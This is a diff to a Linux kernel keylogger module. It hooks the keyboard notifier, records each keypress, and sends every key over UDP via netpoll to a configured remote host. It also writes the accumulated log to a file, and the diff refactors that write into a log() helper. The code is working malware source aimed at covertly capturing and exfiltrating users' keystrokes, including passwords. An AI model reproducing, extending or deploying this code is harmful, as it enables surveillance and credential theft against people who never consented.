@@ -9,10 +9,10 @@
 #include <linux/file.h> 
 #include <linux/fcntl.h>  
 #include <linux/mm.h>
-#include<linux/types.h>
-#include<linux/fs.h>
-#include<linux/string.h>
-#include<asm/uaccess.h>
+#include <linux/types.h>
+#include <linux/fs.h>
+#include <linux/string.h>
+#include <asm/uaccess.h>
 #include "settings.h"
 
 #define KEY_PRESSED 1
@@ -52,6 +52,21 @@ static struct netpoll np;
 char buffer[MAX_BUFFER] = "\nKEYLOG\n--------------------------\n"; //TODO add timestamp
 static struct file *outfile = NULL;
 
+
+void log(char str[]){
+	mm_segment_t prevfs;
+	outfile = filp_open(LOG_DIR, O_RDWR | O_APPEND, 0);
+	if(!outfile)
+	  printk(KERN_ALERT "Error opening file\n");
+	prevfs = USER_DS;
+	set_fs(KERNEL_DS);
+	strcat(buffer, "\n--------------------------\n");
+	outfile->f_op->write(outfile, str, strlen(str), &outfile->f_pos);
+	set_fs(prevfs);
+	if(outfile)
+	  filp_close(outfile, NULL);
+}
+
 /*
 /	keyboard_notifier_callback
 /	must be of the type notifier_fn_t(notifier_block *nb,
@@ -68,12 +83,11 @@ int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, 
 	*/
 	if(action == KBD_KEYCODE && kb->down == KEY_PRESSED) {
 		char message[16];
-		strcat(buffer, message);
 		if(kb->shift == KEY_PRESSED)
 			strcpy(message, keysShift[kb->value]);
 		else
 			strcpy(message, keys[kb->value]);
-
+		strcat(buffer, message);
 		printk(KERN_DEBUG "Sending message: %s\n", message);
 		netpoll_send_udp(&np, message, strlen(message));
 	}
@@ -111,17 +125,7 @@ static int __init init_keylogger(void){
 */
 
 static void __exit exit_keylogger(void){
-	mm_segment_t prevfs;
-	outfile = filp_open(LOG_DIR, O_RDWR | O_APPEND, 0);
-	if(!outfile)
-	  printk(KERN_ALERT "Error opening file\n");
-	prevfs = USER_DS;
-	set_fs(KERNEL_DS);
-	strcat(buffer, "\n--------------------------\n");
-	outfile->f_op->write(outfile, buffer, strlen(buffer), &outfile->f_pos);
-	set_fs(prevfs);
-	if(outfile)
-	  filp_close(outfile, NULL);
+	log(buffer);
 	unregister_keyboard_notifier(&nb);
 }
 
